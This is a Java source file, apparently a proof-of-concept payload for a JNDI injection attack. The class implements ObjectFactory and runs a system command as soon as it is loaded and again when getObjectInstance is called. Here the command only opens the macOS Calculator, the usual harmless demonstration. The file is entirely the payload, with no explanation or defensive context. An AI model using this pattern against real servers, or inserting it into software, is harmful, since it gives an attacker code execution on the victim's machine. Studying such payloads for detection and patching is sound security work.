import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

/**
 * date 2021/12/12 17:19
 *
 * @author hjl
 */
public class Task implements ObjectFactory {
    static {
        System.out.println("I'm static code!");
        execute();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("I'm getObjectInstance function!");
        execute();
        return null;
    }

    public static void execute() {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
